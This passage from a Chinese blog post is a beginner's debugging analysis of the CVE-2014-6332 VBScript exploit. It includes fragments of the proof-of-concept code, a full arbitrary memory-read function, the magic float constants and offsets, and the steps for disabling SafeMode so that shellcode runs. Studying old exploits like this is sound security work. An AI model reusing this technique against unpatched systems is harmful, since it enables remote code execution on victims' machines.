class="line"></span><br><span class="line">function CreateArray()</span><br><span class="line">  On Error Resume Next</span><br><span class="line">  dim i</span><br><span class="line">  CreateArray = False</span><br><span class="line"></span><br><span class="line">  For i = 0 To 400</span><br><span class="line">    If Over() = True Then</span><br><span class="line">       CreateArray = True</span><br><span class="line">       Exit For</span><br><span class="line">    End If</span><br><span class="line">  Next</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">Begin()</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 下面是poc中用到的浮点数在内存中的表现形式,转换很简单，使用 python 的 struct: struct.pack(<span class="string">'&gt;d'</span>, n).encode(<span class="string">'hex'</span>)</span><br><span class="line">1.123456789012345678901234567890 =&gt; 0x3ff1f9add3746f66</span><br><span class="line">1.69759663316747E-313  =&gt;  0x0000000800000008</span><br><span class="line">6.36598737437801E-314  =&gt;  0x0000000300000003</span><br><span class="line">1.74088534731324E-310  =&gt;  0x0000200c0000200c</span><br></pre></td></tr></table></figure>

<p>整个poc执行流程如下：</p>
<ol>
<li>初始数组<code>arrayA</code>, <code>arrayB</code>。</li>
<li>通过循环<code>redim</code> 使得<code>arrayA</code>和<code>arrayB</code>的<code>pvData</code>空间连续(中间相差一个heap指针)。(<code>CreateArray</code>函数)</li>
<li>通过定义函数指针赋给变量的方法获取获取<code>CScriptEntryPoint</code>对象地址,从而找到<code>COleScript</code>对象，然后利用漏洞将伪造的数组结构<code>myarray</code>布局到内存中，使得成功访问到<code>SafeMode</code>并修改其属性值为<code>0</code>，此时已开始上帝模式。(<code>Trigger</code>函数)</li>
<li>执行自定义的命令。(<code>RunWin32Exe</code>函数)</li>
</ol>
<h4 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h4><p>调试poc，在<code>vbscript!VbsIsEmpty</code>处断点进行调试:</p>
<p><img src="/media/cve-2014-6332/memory-layout.png" alt="memory-layout"></p>
<p>调试可以发现，<code>arrayA</code>和<code>arrayB</code>两者的实际数据存储地址只相差8个字节，通过<code>arrayA</code>的越界读，可以使得<code>arrayB</code>的数据能够控制<code>arrayA</code>元素的类型。</p>
<p>而达到需要的内存布局则是通过不断循环<code>redim</code>修改数组来的。数值<code>1.123456789012345678901234567890</code>保存在<code>arrayB(0)</code>中，<code>VARIANT</code>结构的<code>Type</code>为5，值为<code>0x3ff1f9add3746f66</code>,此时访问<code>arrayA(arraySize + 1)</code>, <code>arrayB(0)</code>的 <code>Data High</code> + <code>Data Low</code> 部分会被当成 <code>arrayA(arraySize+1)</code> 的 <code>Type</code> + <code>Reserved</code> 部分，即<code>VarType(arrayA(arraySize+1)) == 0x2f66</code>. (上图中实际<code>Type</code>值是<code>0x6f66</code>, 但是<code>VarType</code>求出来的值是 <code>0x2f66</code>,因为 <code>VbsVarType</code> 中实现是 <code>return *(_WORD *)VAR::PvarGetVarVal(a1, 1) &amp; 0xBFFF</code>; 即少了 <code>0x4000</code>,去掉了引用属性。)</p>
<h4 id="获取-CScriptEntryPoint对象指针"><a href="#获取-CScriptEntryPoint对象指针" class="headerlink" title="获取 CScriptEntryPoint对象指针"></a>获取 <code>CScriptEntryPoint</code>对象指针</h4><p>继续上面的调试，我们在<code>vbscript!AssignVar</code>处下断点，第一次执行会断在<code>arrayB(0)=0</code>处，继续执行，第二次则会断在<code>arrayA(arraySize + 2) = pScriptEntryPoint</code>处，观察数组中的值：</p>
<p><img src="/media/cve-2014-6332/assign-func.png" alt="assign-func"></p>
<p>此时<code>arrayA(arraySize+2)</code>中存放的就是<code>CScriptEntryPoint</code>对象指针，但是由于其类型为<code>VT_NULL</code>无法读出其值。所以需要通过内存错位进行修改。poc中<code>arrayB(0) = 6.36598737437801E-314</code>对应的内存值为<code>0x0000000300000003</code>,而<code>0x3</code>对应的类型为<code>VT_I4</code>，即<code>vbLong</code>型，从而可以读取到<code>CScriptEntryPoint</code>对象指针:</p>
<p><img src="/media/cve-2014-6332/modify-type.png" alt="modify-type"></p>
<p>此时，通过<code>arrayA(arraySize+2)</code>便可读取到<code>CScriptEntryPoint</code>对象指针的值。下一步便是需要通过内存任意地址读写修改<code>Safemode</code>标志位的值从而能够执行命令。</p>
<h4 id="实现内存地址任意读"><a href="#实现内存地址任意读" class="headerlink" title="实现内存地址任意读"></a>实现内存地址任意读</h4><p>在poc中，实现内存地址读的函数为:</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> readMemory(addr)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">redim</span>  <span class="keyword">Preserve</span> arrayA(overSize)</span><br><span class="line">    arrayB(<span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    arrayA(arraySize + <span class="number">2</span>) = addr + <span class="number">4</span></span><br><span class="line">    arrayB(<span class="number">0</span>) = <span class="number">1.69759663316747E-313</span></span><br><span class="line">    readMemory = lenb(arrayA(arraySize + <span class="number">2</span>))</span><br><span class="line">    arrayB(<span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">redim</span>  <span class="keyword">Preserve</span> arrayA(arraySize)</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">function</span></span><br></pre></td></tr></table></figure>

<p>内存地址里的数据主要通过<code>readMemory = lenb(arrayA(arraySize + 2))</code>进行读取，<code>lenb</code>函数用于计算<code>VT_BSTR</code>类型字符串的长度，<code>lenb</code>对应实现函数为<code>vbscript!VbsLenB</code>，用IDA查看：</p>
<p><img src="/media/cve-2014-6332/LenB-0.png" alt="LenB-0"></p>
<p><img src="/media/cve-2014-6332/LenB.png" alt="LenB"></p>
<p>在<code>vbscript!VbsLenB</code>中，实际调用<code>cbLengthBstr</code>函数进行计算字符串的长度，图中<code>a1</code>为字符串地址，可以看到，在求字符串长度时，其实取的是字符串地址前4字节的值。</p>
<p><code>arrayB(0) = 1.69759663316747E-313</code>对应的内存值为<code>0x0000000800000008</code>。通过<code>arrayB(0)</code>将<code>arrayA(arraySize+2)</code>的类型修改为了<code>VT_BSTR</code>。那么<code>0x006af9a4</code>存放的就是字符串所在的地址，地址前的4个字节存放的就是字符串的长度。所以对于<code>lenb(arrayA(arraySize + 2))</code>相当于取得是地址为<code>0x006af9a4-4</code>处存放的值，故前面通过<code>arrayA(arraySize + 2) = addr + 4</code>进行修正。</p>
<p><img src="/media/cve-2014-6332/VT_BSTR.png" alt="VT_BSTR"></p>
<p>上面实现了内存的读取，加上已经找到的<code>CScriptEntryPoint</code>对象指针，下一步便是找到<code>safemode</code>标志位并进行修改。</p>
<p><img src="/media/cve-2014-6332/safemode.png" alt="safemode"></p>
<p>找到标志位后，需要对其进行修改。在<code>setCScriptEntryPoint</code>中，我们构造了一个字符串变量<code>myarray</code>，字符串值为<code>010080080100000000000000000000000000ff7f00000000</code>，观察它在内存中的结构:</p>
<p><img src="/media/cve-2014-6332/myarray.png" alt="myarray"></p>
<p><img src="/media/cve-2014-6332/myarray-1.png" alt="myarray"></p>
<p>可以看到在地址<code>0x004b566c</code>上存的其实是一个精心构造的<code>SAFEARRAY</code>数组。但是在<code>arrayA</code>数组中，被解释为<code>0x8</code>类型，即为<code>VT_BSTR</code>。而后一句<code>arrayB(2) = 1.74088534731324E-310</code>对应的内存值为<code>0x0000200c0000200c</code>,它利用内存错位，将类型由原来的<code>0x8</code>修改成了<code>0x200c</code>，而<code>0x200c</code>表示的是<code>VT_VARIANT|VT_ARRAY</code>。也就是说<code>arrayA</code>中又包含了一个数组，该数组索引从<code>0</code>开始，长度为<code>0x7fff0000</code>，每个元素大小为1字节。</p>
<p>现在，已经实现了任意地址读写，下一步便是修改<code>safemode</code>的值。<code>arrayA(arraySize + 4)(pAddr + &amp;h11c + offset) = arrayB(4)</code>,<code>arrayB(4)</code>中存的<code>VARIANT</code>类型值为<code>0</code>。因为修改时长度为4字节，因此偏移<code>&amp;h120</code>需要修改成<code>&amp;h11c</code>。</p>
<p>此时，<code>safemode</code>已经被置为<code>0</code>,后面便可成功运行<code>RunWin32Exe</code>中的shellcode了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次调试这样的漏洞，以新手视角进行书写。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://paper.seebug.org/240/" target="_blank" rel="noopener">https://paper.seebug.org/240/</a></li>
<li><a href="https://bbs.pediy.com/thread-248273.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248273.htm</a></li>
<li><a href="https://bbs.pediy.com/thread-248310.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248310.htm</a></li>
</ol>

  </div>
</article>

<div id="paginator">
  
</div>

      </div>
    </div>
    
<footer class="footer">
    <div id="bottom-inner">
      &copy; Conan
      
        <span>2016</span> &mdash;
      
      <span>2019</span>
    </div>
</footer>

  </div>

  
    
      <script src="/js/hello.js"></script>
    
  

  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-35288944-1"></script>
<script>
  var host = window.location.hostname;
  if (host != "localhost" || host != "127.0.0.1") {
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'UA-35288944-1');
  }
</script>



</body>
</html>
